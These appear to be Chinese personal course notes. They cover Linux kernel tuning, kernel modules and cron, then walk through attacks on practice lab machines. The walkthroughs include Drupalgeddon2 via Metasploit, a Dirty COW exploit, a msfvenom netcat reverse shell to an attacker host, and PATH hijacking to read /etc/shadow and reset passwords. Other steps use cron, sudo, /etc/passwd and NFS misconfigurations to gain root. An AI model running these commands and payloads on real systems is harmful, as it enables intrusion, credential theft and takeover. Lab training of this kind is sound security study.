net.ipv4.tcp_syncookies = 1  //抵御SYN Flood能力  表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；
net.ipv4.tcp_keepalive_time =600	//表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。
net.ipv4.ip_local_port_range = 32768   60999 //表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为1024到65000。
net.ipv4.tcp_max_syn_backlog = 8182	//表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。
net.core.somaxconn = 1024	//该参数用于调节系统同时发起的TCP连接数，一般默认值为128.在客户端存在高并发请求的情况下，该默认值较小可能导致链接超时或者重传问题，我们可以根据实际需要结合并非请求来调整该值。
net.ipv4.tcp_max_tw_buckets = 5000	//表示系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数字，TIME_WAIT套接字将立刻被清除并打印警告信息。
net.ipv4.tcp_syn_retries = 1	//表示应用程序进行connect()系统调用时，在对方不返回SYN + ACK的情况下(也就是超时的情况下)，第一次发送之后，内核最多重试几次发送SYN包;并且决定了等待时间.
net.ipv4.tcp_synack_retries = 1	//该参数用于设置内核放弃TCP 链接之前向客户端发送SYN+ACK 包的数量。为了简历对端的链接服务，服务器和客户端需要进行三次握手，第二次握手期间，内核需要发送SYN 并附带一个回应前一个SYN 的ACK，这个参数主要影响这个过程，一般赋值为1，即内核放弃链接之前发送一次SYN+ACK包
net.ipv4.tcp_max_orphans = 2000	//该参数用于设定系统中最多允许在多少TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字，没有与用户文件句柄关联的TCP 套接字将立即被复位，同时给出警告信息。这个限制只是为了防止简单点的Dos 攻击。一般在系统内存比较充足的情况下可以增大这个参数
### *79天
79.1 管理Linux内核模块
内核文件一般都是压缩文件，在加载到内存之前需要进行解压缩。
核心解压时需要一个内存磁盘（RAM DISK）
文件名：/boot/initramfs-内核版本或
		/boot/initrd.img--内核版本
（1）模块文件存放位置
		/lib/modules/`uname -r`/kernel
（2）模块之间有相互的依赖性

（3）模块文件的扩展名*.ko

（4）内核模块的管理
		方法1：insmod工具集（老的方法）
		方法2： modprobe （推荐）
		
（5）lsmod 列出核心加载的模块
（6）modinfo 列出模块的详细信息

（7）模块的加载和删除
加载一个模块
insmod /lib/modules/`uname -r`/kernel/fs/fat/fat.ko
删除模块
rmmod

modprobe 自动解决模块之间的依赖关系
案例：CIFS
modprobe cifs
modprobe -r cifs

dmesg  //查看系统详细的硬件信息

uname -r
lsmod 
modprobe -a
sysctl -w net.ipv4.ip_forward=1 

腾讯哈勃分析系统 (qq.com) 
悟空扫描器 https://github.com/Lee-0x00/wukong-agent

### *80天
 Lampiao靶机实战
 
 1、信息探测
 
 nmap -p- -A 192.168.195.154
-p-  等同于 -p 1-65535
-A   积极的综合的扫描 

2. HTTP探测
Burp Suite

经常在应用程序所在服务器的响应标头中披露CMS的版本

 Drupal 7
 
3. 漏洞利用


	CVE-2018-7600

在MSF
search drupal
use explot/unix/webapp/drupal_drupalgeddon2
set rhost 192.168.195.176
set rport 1898
exploit


进入交互式shell
python -c 'import pty;pty.spawn("/bin/bash")'



提权

### *81天
利用Linux内核漏洞进行提权
（1）信息收集，例如查看当前权限、查看系统版本和内核版本等。

（2）根据收集到的信息查找EXP。

（3）使用EXP提权。


export PATH=.:$PATH

查找UID为0的用户
awk -F : '($3==0){print $1}' /etc/passwd
查找SUID位的文件
find / -user root -perm -4000 -exec ls -ldb {}  2>/dev/null  \;

www-data@lampiao:/var/www/html$ uname -a
uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
www-data@lampiao:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.5 LTS
Release:        14.04
Codename:       trusty

https://github.com/SecWiki/linux-kernel-exploits

searchsploit dirty 
40847.cpp
searchsploit -m 40847.cpp
-m  把找到的exp镜像（复制）一份到当前目录
wget http://192.168.195.171:9000/40847.cpp
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ./dcow -s 
 https://www.exploit-db.com/exploits/40847


https://blog.51cto.com/wangenzhi/1674996

### *82天

Chapter 使用作业调度实现自动化任务

计划任务

at   一次性
cron 服务 周期性
crontab 管理cron服务的工具
-u  指定的用户
-e  编辑
-l  列出
-r  删除
/etc/crontab 系统的任务计划文件
也可以为每个用户编辑任务计划文件
mkdir /tmp/test

[案例]设置一个备份计划任务

Crontab的快捷方式
crontab 文件有些内置的快捷方式，用来代替具体的时间，日期，月份
@reboot 每次系统启动时


rc.d脚本
update-rc.d 服务名称  enable  设置服务开机启动
update-rc.d 服务名称  disable  设置服务开机不启动
update-rc.d postgresql enable
验证：重启后
ps aux | grep postgresql
netstat -tnlp 

也可以通过rcconf这个图形化工具管理服务的开机启动
apt-get install rcconf


### *83-90天
网络攻防实战
靶机实战四：Escalate_Linux
1、信息收集
扫描

nmap -A -p- -o escalate.nmap 192.168.195.175

2、HTTP探测
dirb http://192.168.195.175 -X .php  

3、发现Web站点存在命令注入的漏洞  

http://192.168.195.175/shell.php?cmd=id

想一想我还能做什么？

4、MSF中web_delivery模块（实现Webshell的远程投递）

This module quickly fires up a web server that serves a payload. The 
  module will provide a command to be run on the target machine based 
  on the selected target. The provided command will download and 
  execute a payload using either a specified scripting language 
  interpreter or "squiblydoo" via regsvr32.exe for bypassing 
  application whitelisting. The main purpose of this module is to 
  quickly establish a session on a target machine when the attacker 
  has to manually type in the command: e.g. Command Injection, RDP 
  Session, Local Access or maybe Remote Command Execution. This attack 
  vector does not write to disk so it is less likely to trigger AV 
  solutions and will allow privilege escalations supplied by 
  Meterpreter. When using either of the PSH targets, ensure the 
  payload architecture matches the target computer or use SYSWOW64 
  powershell.exe to execute x86 payloads on x64 machines. Regsvr32 
  uses "squiblydoo" technique to bypass application whitelisting. The 
  signed Microsoft binary file, Regsvr32, is able to request an .sct 
  file and then execute the included PowerShell command inside of it. 
  Similarly, the pubprn target uses the pubprn.vbs script to request 
  and execute a .sct file. Both web requests (i.e., the .sct file and 
  PowerShell download/execute) can occur on the same port. The 
  SyncAppvPublishingServer target uses SyncAppvPublishingServer.exe 
  Microsoft signed binary to request and execute a PowerShell script. 
  This technique only works on Windows 10 builds <= 1709. "PSH 
  (Binary)" will write a file to the disk, allowing for custom 
  binaries to be served up to be downloaded and executed.


use exploit/multi/script/web_delivery
set SRVHOST 192.168.195.171（攻击端的地址）
set LHOST 192.168.195.171（攻击端的地址）
exploit

use exploit/multi/script/web_delivery
set SRVHOST 192.168.195.13
set LHOST 192.168.195.13
exploit

python -c 'import pty;pty.spawn("/bin/bash")'


5. 提权练习

信息收集
wget http://192.168.195.171:9000/LinEnum.sh 


Method1： 

find / -user root -perm  -4000 -type f 2>/dev/null -exec ls -l {} \;

-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user3/shell
cd /home/user3/shell 
file shell  //查看文件类型
./shell 

Method2 环境变量劫持提权
在执行 /home/user5/script 调用的是系统的ls命令

echo "/bin/bash" >/tmp/ls 
chmod 755 /tmp/ls 
export PATH=/tmp:$PATH  
PS：export把变量输出为全局环境变量

在Shell输入命令时，Shell会按PATH环境变量中的路径依次搜索命令，若是存在同名的命令，则执行最先找到的，若是PATH中加入了当前目录，也就是“.”这个符号，则可能会被黑客利用



Method3: Get a root shell by cracking the root password
通过读取密码文件/etc/shadow来破解root用户的口令

echo "cat /etc/shadow" >/tmp/ls 
chmod 755 /tmp/ls 
export PATH=/tmp:$PATH 
/home/user5/script

root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::

echo 'root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1'>hash.txt 

hash密码的破解工具
hashcat
john

john hash.txt  


Method 4: Get root shell by exploiting SUDO rights of user1
利用用户的sudo授权获得root的shell

/etc/sudoers  sudo提权的配置文件
echo 'cat /etc/sudoers' >/tmp/ls

root    ALL=(ALL:ALL) ALL
user1   ALL=(ALL:ALL) ALL 
//user1可以以所有用户身份执行所有命令，user1其实就是一个管理员
user2   ALL=(user1) ALL
user8   ALL=(root) NOPASSWD: /usr/bin/vi
想办法更改User1的口令？
echo 'echo "user1:xiaoxiao" | chpasswd' >/tmp/ls
/home/user5/script

su - user1
sudo su -




wget http://192.168.195.122:8086/CVE-2021-4034-main.zip


Method5:Get root shell by exploiting crontab
利用任务计划提权
cat /etc/crontab

*/5  *    * * * root    /home/user4/Desktop/autoscript.sh

思路：这个脚本以root身份每隔5分钟运行一次
修改这个脚本，以user4的身份去更改
修改user4的密码

echo 'echo "user4:xiaoxiao" | chpasswd ' >/tmp/ls
chmod +x /tmp/ls  
export PATH=/tmp:$PATH
/home/user5/script

脚本中写什么呢？
方法1
echo "/bin/bash" >autoscript.sh  不好使！

反弹一个shell
方法2
echo "nc -nv 192.168.195.13 8888 -e /bin/bash" >autoscript.sh 不好使！
方法3：
利用msfvenom生成一个反向shell
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.195.13 lport=8888

┌──(root💀kali)-[~]
└─# msfvenom -p cmd/unix/reverse_netcat lhost=192.168.195.13 lport=8888
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 104 bytes
mkfifo /tmp/iibhxgy; nc 192.168.195.13 8888 0</tmp/iibhxgy | /bin/sh >/tmp/iibhxgy 2>&1; rm /tmp/iibhxgy


把生成的payload写入脚本中
echo 'mkfifo /tmp/iibhxgy; nc 192.168.195.13 8888 0</tmp/iibhxgy | /bin/sh >/tmp/iibhxgy 2>&1; rm /tmp/iibhxgy' > autoscript.sh


Kali
nc -nvp 8888

cat >> autoscript.py << EOF
#!/usr/bin/env python
import os
import sys
try:
	os.system('chmod u+s /bin/bash')
except:
	sys.exit()
EOF
root用户下改

背景：任务计划里有一个以root用户执行的Py脚本

实验环境的准备
以root用户登录 （密码：12345）	
sed -i 's#autoscript.sh#autoscript.py#' /etc/crontab  //查找替换
效果如下：
cat /etc/crontab
*/5  *    * * * root    /home/user4/Desktop/autoscript.py
开始实施提权
（1）先在Kali端手动编写一个autoscript.py脚本，内容如下
#!/usr/bin/env python
import os
import sys
try:
	os.system('chmod u+s /bin/bash')
except:
	sys.exit()
架设一个HTTP服务器
python3 -m http.server 9000
（2）靶机切换到user4
cd /home/user4/Desktop
使用 wget http://192.168.195.13:9000/autoscript.py
chmod +x autoscript.py
（3）效果（等5分钟）
ls -l /bin/bash
/bin/bash 不行
/bin/bash -p
高版本的Linux中，如果启动bash的Effective（有效的） UID与Real（真实的） UID不相同，而且没有使用-p参数，则bash会将Effective UID 还原成Real UID

Method6:Exploiting SUDO rights of vi editor
利用sudo去运行vi编辑器实施提权

1）利用之前的方法查看sudo授权配置文件/etc/sudoers
echo 'cat /etc/sudoers' >/tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/home/user5/script 


root    ALL=(ALL:ALL) ALL
user1   ALL=(ALL:ALL) ALL
user2   ALL=(user1) ALL
user8   ALL=(root) NOPASSWD: /usr/bin/vi

2）更改user8的用户口令
echo 'echo "user8:xiao" | chpasswd' >/tmp/ls
/home/user5/script 
su - user8

sudo -l 查看授权列表

:!/bin/bash  此时就是以root用户身份执行bash



PS1：使用visudo编辑修改授权配置文件/etc/sudoers



Method7 利用管理用户进行提权

user1   ALL=(ALL:ALL) ALL
user2   ALL=(user1) ALL
1）先改User1和User2的密码
echo 'echo "user2:xiao" | chpasswd' >/tmp/ls
/home/user5/script 
echo 'echo "user1:xiao" | chpasswd' >/tmp/ls
/home/user5/script 




2）
先切换到user1的shell
sudo -u user1 /bin/bash
3）
再由user1切换到管理员 sudo su -

2）和3）执行一步就行sudo -u user1 sudo su -

user2  ~  sudo -u user1 sudo su -
sudo -u user1 sudo su -
[sudo] password for user2: xiao

[sudo] password for user1: xiao

sudo -k  清除凭据

Method 7: Exploiting writable permission of /etc/passwd file
利用对/etc/passwd文件具有写入权限的能力进行提权
思路：可以写一个超级用户（uid号为0的用户）

user6  / | var | www | html  grep root /etc/group                             
grep root /etc/group
root:x:0:user4,user7

echo 'echo "user7:xiao" | chpasswd' >/tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/home/user5/script 
echo 'echo "user4:xiao" | chpasswd' >/tmp/ls
/home/user5/script 


root:x:0:0:root:/root:/bin/bash
用户名:密码:用户id:组id:用户描述：家目录：用户shell
密码部分为x表明密码是存储在/etc/shadow文件中

ec
//此处的密码不能是明文形式，必须是使用的哈唏算法产生的密文

echo 'test:$1$test$at615QShYKduQlx5z9Zm7/:0:0:root:/root:/bin/bash' >>/etc/passwd


Method8:利用MySQL数据库配置不当提权

（1）netstat -tnlp
（2）mysql -uroot -proot（存在弱口令）
	select * from user.user_info;
	得到了mysql的用户口令mysql@12345
（3）利用mysql用户登录 
	su - mysql
（4）chmod +644 .user_informations
（5）cat .user_informations 得到了用户的密码信息
user2:user2@12345
user3:user3@12345
user4:user4@12345
user5:user5@12345
user6:user6@12345
user7:user7@12345
user8:user8@12345
（6）cat /etc/mysql/secret.cnf，得到了root的口令
root@12345
Method10: NFS提权
NFS---文件服务器
/home/user5   192.168.195.33(rw,no_root_squash)  
管理员做出了错误的配置

Kali
（1）查询共享
showmount -e 192.168.195.177
（2）mkdir /tmp/nfs  
mount -t nfs 192.168.195.177:/home/user5 /tmp/nfs
PS:卸载远程文件系统 umount /tmp/nfs（挂载点）

df -T
（3）cd /tmp/nfs （此时对远程文件系统具有root权限，可以复制一个shell，并给予suid位）
     cp /usr/bin/sh  .
     chmod u+sx sh	 
在目标
/home/user5/sh -p











































 
 





































